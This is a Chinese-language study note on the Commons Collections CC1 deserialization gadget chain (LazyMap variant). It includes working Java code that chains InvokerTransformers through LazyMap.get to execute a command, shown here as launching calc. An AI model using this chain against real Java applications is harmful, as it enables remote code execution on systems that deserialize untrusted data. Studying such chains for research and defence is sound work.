## ChainedTransformer实现rce
前面还是一样的通过`ChainedTransformer的transform`方法递归调用`InvokerTransformer的transform`方法从而实现命令执行。

那么我们现在的目标就是找到一个可以调用`ChainedTransformer的transform`方法的地方，这里我们找的是`LazyMap中的get`方法，而CC1中选择的是`TransformedMap中的checkSetvalue`
![](assets/CC1%20国外/file-20251204161845259.png)
## LazyMap实现transform
我们只需要给`factory`参数赋值为`ChainedTransformer`就好了。注意这里需要绕过一个if判断，我们传一个空的Object对象就好。
```java
Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null, null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        HashMap<Object,Object> map = new HashMap();  
  
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);  
        lazymap.get(new Object());
```
这里就通过我们手动调用`get`方法实现了rce。（因为构造方法是protect的所以要通过decorate方法构造对象）。

## 

然后我们要去看谁能调用get方法，这里太多了，必须对开发很理解了。只能记住了。
找到的是`AnnotationInvocationHandler` 